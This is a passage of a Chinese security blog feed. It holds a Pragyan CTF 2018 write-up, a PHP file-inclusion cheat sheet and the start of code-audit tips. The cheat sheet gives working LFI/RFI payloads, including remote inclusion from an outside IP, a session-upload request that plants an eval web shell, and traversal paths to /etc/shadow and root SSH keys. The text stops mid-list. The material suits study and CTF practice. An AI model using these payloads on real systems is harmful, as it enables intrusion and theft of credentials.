rel="noopener">https://jaq.alibaba.com/community/art/show?articleid=473</a></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> stackoverflow </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>pragyan-ctf-2018</title>
      <link href="//blog/2018/pragyan-ctf-2018.html"/>
      <url>//blog/2018/pragyan-ctf-2018.html</url>
      
        <content type="html"><![CDATA[<h2 id="Authenticate-your-way-to-admin"><a href="#Authenticate-your-way-to-admin" class="headerlink" title="Authenticate your way to admin"></a>Authenticate your way to admin</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Owen had created an authentication system which lets users login with their email-id or their team name. But that’s not fun is it? Logging in as the admin beats it all, so there’s your challenge.</span><br><span class="line">The portal is running at 128.199.224.175:23000</span><br><span class="line">Note: Use your Pragyan CTF credentials to login to the web portal.</span><br></pre></td></tr></table></figure><p>提供了以下连个php<br>login.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">"helpers.php"</span>;</span><br><span class="line"></span><br><span class="line">$type = $_POST[<span class="string">'id_type'</span>];</span><br><span class="line">$identifier = $_POST[<span class="string">'identifier'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">$_SESSION[<span class="string">'id'</span>] = $identifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($type === <span class="string">'team_name'</span>) &#123;</span><br><span class="line">    $team_name = $identifier;</span><br><span class="line">    $_SESSION[<span class="string">'id_type'</span>] = <span class="string">'team_name'</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(verify_teamname_password($team_name, $password) === <span class="keyword">true</span>) &#123;</span><br><span class="line">        $_SESSION[<span class="string">'logged_in'</span>] = <span class="keyword">true</span>;</span><br><span class="line">        redirect(<span class="string">'/homepage.php'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Invalid Team Name-Password combination !!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($type === <span class="string">'email'</span>) &#123;</span><br><span class="line">    $email = $identifier;</span><br><span class="line">    $_SESSION[<span class="string">'id_type'</span>] = <span class="string">'email'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(verify_email_password($email, $password) === <span class="keyword">true</span>) &#123;</span><br><span class="line">        $_SESSION[<span class="string">'logged_in'</span>] = <span class="keyword">true</span>;</span><br><span class="line">        redirect(<span class="string">'/homepage.php'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Invalid Email-Password combination !!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>homepage.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">"helpers.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(! check_login())</span><br><span class="line">    redirect($LOGIN_URL);</span><br><span class="line"></span><br><span class="line">$id_type = $_SESSION[<span class="string">'id_type'</span>];</span><br><span class="line">$id = $_SESSION[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Homepage&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body style=<span class="string">'background-color: #d6eaf8'</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;p style=<span class="string">"float: right"</span>&gt;</span><br><span class="line">&lt;a href=<span class="string">'/logout.php'</span>&gt; Logout &lt;/a&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;p style=<span class="string">"clear: both"</span>&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p style=<span class="string">'height:30px; width:100%;'</span>&gt; &lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;center&gt;</span><br><span class="line">    </span><br><span class="line">&lt;h2&gt; Welcome User !! &lt;/h2&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">&lt;h3&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($id_type === <span class="string">'email'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Email :- "</span>.$id;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($id_type === <span class="string">'team_name'</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Team Name :- "</span>.$id ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/h3&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">&lt;h4&gt;</span><br><span class="line">Here<span class="string">'s a random funny saying for you :) &lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;/h4&gt;</span></span><br><span class="line"><span class="string">&lt;br&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">    require "sayings.php";</span></span><br><span class="line"><span class="string">    printf(get_random_saying());</span></span><br><span class="line"><span class="string">    echo "&lt;br&gt;&lt;br&gt;";</span></span><br><span class="line"><span class="string">    if($id === '</span>admin<span class="string">' &amp;&amp; $id_type === '</span>team_name<span class="string">')</span></span><br><span class="line"><span class="string">        printf(output_flag());</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure></p><p>首先，用正常的账户登录，得到的session为logged_in=true<br>然后，用同样的sessionid访问login.php文件，post数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">identifier=admin&amp;id_type=team_name&amp;password=admin</span><br></pre></td></tr></table></figure></p><p>即可使当前这个session的<code>$id === &#39;admin&#39; &amp;&amp; $id_type === &#39;team_name&#39;</code><br>然后，y用这个sessionid访问homepage即可得到flag<br><img src="/img/pragyan/1.png" alt=""></p><h2 id="El33t-Articles-Hub"><a href="#El33t-Articles-Hub" class="headerlink" title="El33t Articles Hub"></a>El33t Articles Hub</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Are you a person interested in reading articles on hacking? You’ve come to the right place, check out our brand new website for article-reading enthusiasts.</span><br><span class="line">The portal is running on 128.199.224.175:22000</span><br></pre></td></tr></table></figure><p>有两个位置存在文件读取或者包含的可能<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://128.199.224.175:22000/index.php?file=Travel</span><br><span class="line">http://128.199.224.175:22000/favicon.php?id=1</span><br></pre></td></tr></table></figure></p><p>第一个链接测试发现做了过滤，第二个链接很容易发现问题<br><img src="/img/pragyan/2.png" alt=""><br>可以看到会尝试访问<br> ‘./favicons/1..png’, ‘./favicons/1..ico’  or ‘./favicons/1..php’<br> 提交file=../index<br><img src="/img/pragyan/3.png" alt=""><br>可以获取到各种相关的php源代码<br>然后在<br><img src="/img/pragyan/4.png" alt=""><br>发现了flag文件名，拼接一下<br><img src="/img/pragyan/5.png" alt=""></p><h2 id="Quick-Response"><a href="#Quick-Response" class="headerlink" title="Quick Response"></a>Quick Response</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tony had created a QR code for a specific purpose, and sent to his friend Rhody for deployment but when deployed, the QR code wasn’t working as it was supposed to. Figure out what’s wrong and help fix the problem.</span><br></pre></td></tr></table></figure><p>QR Code的修复，</p><p>扫描器确定二维码的位置的方法很简单<br>只需要找到左上角、左下角和右上角的“回”字的正方图案俗称：定位点）<br>不需要完全对正<br>不同位置有无像素点的情况<br>可以被转换成 0/1的数据<br>进而还原二维码里面的文字<br><img src="/img/pragyan/6.png" alt=""></p><p>修复前<br><img src="/img/pragyan/i_am_qr.png" alt=""></p><p>修复后<br><img src="/img/pragyan/i_am_qr2.png" alt=""></p><p>扫一扫</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PHP文件包含</title>
      <link href="//blog/2018/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.html"/>
      <url>//blog/2018/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP在引入文件时，对传入的文件名没有进行恰当的校验</span><br></pre></td></tr></table></figure><h2 id="完全控制文件名"><a href="#完全控制文件名" class="headerlink" title="完全控制文件名"></a>完全控制文件名</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>完全控制文件名，可用的操作非常多。</p><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><h4 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h4><blockquote><p>要求allow_url_open=on(默认on) &amp;&amp; allow_url_include=on(PHP &lt; 5.30默认on，以后默认off) </p></blockquote><h5 id="data协议"><a href="#data协议" class="headerlink" title="data协议"></a>data协议</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://myhack.com/index.php?file=data://text/plain,<span class="php"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span></span><br><span class="line">http://myhack.com/index.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br><span class="line">http://myhack.com/index.php?file=data:text/plain,<span class="php"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span></span><br><span class="line">http://myhack.com/index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure><h5 id="php-input（allow-url-open可以是off）"><a href="#php-input（allow-url-open可以是off）" class="headerlink" title="php://input（allow_url_open可以是off）"></a>php://input（allow_url_open可以是off）</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">数据包</span><br><span class="line">POST /index.php?file=php://input HTTP/1.1</span><br><span class="line">Host: myhack.com</span><br><span class="line">content-type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 18</span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h5 id="http协议-https协议"><a href="#http协议-https协议" class="headerlink" title="http协议/https协议"></a>http协议/https协议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://myhack.com/index.php?file=http://118.88.99.44/php.txt</span><br></pre></td></tr></table></figure><h5 id="ftp协议"><a href="#ftp协议" class="headerlink" title="ftp协议"></a>ftp协议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://myhack.com/index.php?file=ftp://gaia:123456@118.88.99.44/php.txt</span><br></pre></td></tr></table></figure><h3 id="LFI-本地文件包含"><a href="#LFI-本地文件包含" class="headerlink" title="LFI 本地文件包含"></a>LFI 本地文件包含</h3><h4 id="GetShell-1"><a href="#GetShell-1" class="headerlink" title="GetShell"></a>GetShell</h4><h4 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h4><p>结合<strong>PHP_SESSION_UPLOAD_PROGRESS</strong></p><p>session文件默认路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sessions/sess_PHPSESSID</span><br><span class="line"></span><br><span class="line">/var/lib/php5/sess_PHPSESSID</span><br><span class="line">/var/lib/php5/sessions/sess_PHPSESSID</span><br><span class="line"></span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /inc.php?file=/var/lib/php/sessions/sess_gaia HTTP/1.1</span><br><span class="line">Host: 118.88.99.44</span><br><span class="line">User-Agent: curl/7.47.0</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID=gaia;</span><br><span class="line">Content-Type: multipart/form-data; boundary=--------WebKitFormBoundary2rwkUEtFdqhGMHqV</span><br><span class="line">Content-Length: 419</span><br><span class="line"></span><br><span class="line">----------WebKitFormBoundary2rwkUEtFdqhGMHqV</span><br><span class="line">Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"</span><br><span class="line"></span><br><span class="line">blahblahblah</span><br><span class="line">----------WebKitFormBoundary2rwkUEtFdqhGMHqV</span><br><span class="line">Content-Disposition: form-data; name="file0"; filename="<span class="php"><span class="meta">&lt;?php</span> file_put_contents(<span class="string">'cmd.php'</span>,<span class="string">'&lt;?php @eval($_POST[\'c\']);?&gt;</span></span>');?&gt;"</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">abcxxxxxxxxxxxxxxxxxx paste big file here</span><br><span class="line">----------WebKitFormBoundary2rwkUEtFdqhGMHqV--</span><br></pre></td></tr></table></figure><p>多线程跑一下</p><p>其他可以控制session内容的情况</p><p>包含session文件</p><h5 id="包含上传文件"><a href="#包含上传文件" class="headerlink" title="包含上传文件"></a>包含上传文件</h5><p>包含自己上传的文件，如图片马</p><h5 id="包含上传临时文件"><a href="#包含上传临时文件" class="headerlink" title="包含上传临时文件"></a>包含上传临时文件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">php文件上传流程</span><br><span class="line">HTTP POST with a file arrives</span><br><span class="line">PHP begins analysis</span><br><span class="line">PHP creates temp file</span><br><span class="line">PHP writes data to temp file</span><br><span class="line">PHP close temp file</span><br><span class="line">script execution begins</span><br><span class="line">[optional] script moves uploaded file</span><br><span class="line">script execution ends</span><br><span class="line">PHP removes temp files(if any)</span><br></pre></td></tr></table></figure><p>结合phpinfo泄露临时文件路径</p><p>利用php://filter漏洞(预计10分钟)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php7的低版本存在的bug</span><br><span class="line">include.php?file=php://filter/string.strip_tags/resource=/etc/passwd</span><br><span class="line">在&quot;string.strip_tags&quot;中会产生segment fault，导致执行流程异常结束，上传的临时文件没有被删除。</span><br><span class="line">所以，多线程上传文件，多线程包含。</span><br></pre></td></tr></table></figure><p>竞争包含临时文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">目录在php.ini的upload_tmp_dir中定义，默认为空，则</span><br><span class="line">windows: </span><br><span class="line">C:\windows\temp</span><br><span class="line">调用的函数是GetTempFileName</span><br><span class="line">&lt;path&gt;\&lt;pre&gt;&lt;uuuu&gt;.TMP</span><br><span class="line">C:\windows\temp   \    php  4个十六进制 .TMP</span><br><span class="line"></span><br><span class="line">共65535种文件名，且，利用当前系统时间(毫秒)，可以更加容易猜解</span><br><span class="line">更强的是，在windows本地文件包含中，可以利用&apos;&lt;&lt;&apos;代替&apos;*&apos;，利用&apos;&gt;&apos;代替&apos;?&apos;</span><br><span class="line">所以，</span><br><span class="line">http://site/vuln.php?inc=c:\windows\temp\php&lt;&lt;</span><br><span class="line">当然，当前目录可能存在别的文件，可以考虑限制为</span><br><span class="line">php1&lt;&lt; 或 phpA&lt;&lt; 或 php11&lt;&lt;</span><br><span class="line">然后，上传，直到匹配</span><br><span class="line">linux:</span><br><span class="line">/tmp/</span><br><span class="line">调用的函数是mkstemp</span><br><span class="line">1. random_value = (seed += time() ^ PID)</span><br><span class="line">2. random_value = (seed += (gettimeofday().sec &lt;&lt; 32 | gettimeofday().usec)</span><br><span class="line">^ PID)</span><br><span class="line">3. random_value = (seed += rdtsc ^ PID)</span><br><span class="line">最终，6 位 k=62 (A-Za-z0-9 charset) 字符</span><br><span class="line">拼接成 /tmp/phpUs7MxA</span><br><span class="line">情况太多，几乎无法利用，</span><br><span class="line">如果可能的话，是能够列举/tmp目录下的文件，且需要将文件上传到一个处理时间很长的页面</span><br><span class="line">利用竞争条件，包含文件。</span><br></pre></td></tr></table></figure><h5 id="包含-proc-self-environs"><a href="#包含-proc-self-environs" class="headerlink" title="包含/proc/self/environs"></a>包含/proc/self/environs</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">限制：PHP需要运行CGI，系统需要有/proc，PHP脚本需要有权限读取/proc/self/environ</span><br></pre></td></tr></table></figure><h5 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Apache log</span><br><span class="line"></span><br><span class="line">SSH log</span><br></pre></td></tr></table></figure><h4 id="读取敏感文件"><a href="#读取敏感文件" class="headerlink" title="读取敏感文件"></a>读取敏感文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">../../../../../etc/passwd  </span><br><span class="line">../../../../../etc/shadow</span><br><span class="line">../../../../../etc/hosts</span><br><span class="line">../../../../../var/lib/locate.db</span><br><span class="line">../../../../../var/lib/mlocate/mlocate.db</span><br><span class="line">../../../../etc/apache2/apache2.conf</span><br><span class="line">../../../../etc/apache2/sites-available/000-default.conf</span><br><span class="line">../../../../etc/apache2/conf/httpd.conf</span><br><span class="line">../../../../root/.bash_history</span><br><span class="line">../../../../root/.ssh/id_rsa</span><br><span class="line">../../../../var/log/apache/error.log</span><br><span class="line">C:/WINDOWS/win.ini</span><br><span class="line">C:/WINDOWS/system.ini</span><br><span class="line">结合PHP伪协议读取源码</span><br><span class="line">php://filter/read=convert.base64-encode/resource=./index</span><br><span class="line">php://filter/convert.base64-encode/resource=./index</span><br><span class="line">file协议读取文件</span><br><span class="line">file:///etc/passwd</span><br></pre></td></tr></table></figure><h3 id="限制文件名结尾部分"><a href="#限制文件名结尾部分" class="headerlink" title="限制文件名结尾部分"></a>限制文件名结尾部分</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'file'</span>].<span class="string">".html"</span>);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><h4 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../../etc/passwd%00</span><br><span class="line">(需要 magic_quotes_gpc=off，PHP小于5.3.4有效)</span><br><span class="line">%00截断目录遍历：</span><br><span class="line">?file=../../../../../../../../../var/www/%00</span><br><span class="line">(需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</span><br></pre></td></tr></table></figure><h4 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a>路径长度截断</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.</span><br><span class="line">(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)</span><br></pre></td></tr></table></figure><h4 id="点号截断："><a href="#点号截断：" class="headerlink" title="点号截断："></a>点号截断：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../../boot.ini/………[…]…………</span><br><span class="line">(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</span><br></pre></td></tr></table></figure><h3 id="限制文件名开头部分"><a href="#限制文件名开头部分" class="headerlink" title="限制文件名开头部分"></a>限制文件名开头部分</h3><h4 id="回溯目录"><a href="#回溯目录" class="headerlink" title="../ 回溯目录"></a>../ 回溯目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../../../../../</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>代码审计小Tips</title>
      <link href="//blog/2018/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8FTips.html"/>
      <url>//blog/2018/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8FTips.html</url>
      
        <content type="html"><![CDATA[<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><h4 id="mysql-escape-string"><a href="#mysql-escape-string" class="headerlink" title="mysql_escape_string()"></a>mysql_escape_string()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(PHP 4 &gt;= 4.0.3, PHP 5)</span><br><span class="line">null byte (0), newline (\n), carriage return (\r), backslash (\), </span><br><span class="line">single quote (&apos;), double quote (&quot;) and substiture (SUB, or \032)</span><br><span class="line">不转义 % 和 _</span><br></pre></td></tr></table></figure><ul><li>绕过方法: 貌似只能考虑宽字节注入了</li></ul><h4 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_real_escape_string()"></a>mysql_real_escape_string()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(PHP 4 &gt;= 4.3.0, PHP 5)</span><br><span class="line">\x00, \n, \r, \, &apos;, &quot; and \x1a</span><br></pre></td></tr></table></figure><ul><li>绕过方法: 貌似只能考虑宽字节注入了</li></ul><h4 id="伪造ip地址"><a href="#伪造ip地址" class="headerlink" title="伪造ip地址"></a>伪造ip地址</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">X-Originating-IP: 127.0.0.1</span><br><span class="line">X-Remote-IP: 127.0.0.1</span><br><span class="line">X-Remote-Addr: 127.0.0.1</span><br><span class="line">X-Client-IP: 127.0.0.1</span><br><span class="line">X-Real-IP</span><br><span class="line">Proxy-Clinet-IP</span><br><span class="line">CDN-Src-IP</span><br></pre></td></tr></table></figure><h4 id="正则表达式模式修饰符"><a href="#正则表达式模式修饰符" class="headerlink" title="正则表达式模式修饰符"></a>正则表达式模式修饰符</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、/g 表示该表达式将用来在输入字符串中查找所有可能的匹配，返回的结果可以是多个。如果不加/g最多只会匹配一个</span><br><span class="line">2、/i 表示匹配的时候不区分大小写，这个跟其它语言的正则用法相同</span><br><span class="line">3、/m 表示多行匹配。什么是多行匹配呢？就是匹配换行符两端的潜在匹配。影响正则中的^$符号</span><br><span class="line">4、/s 与/m相对，单行模式匹配</span><br><span class="line">5、/e 可执行模式，此为PHP专有参数，例如preg_replace函数</span><br><span class="line">6、/x 忽略空白模式</span><br><span 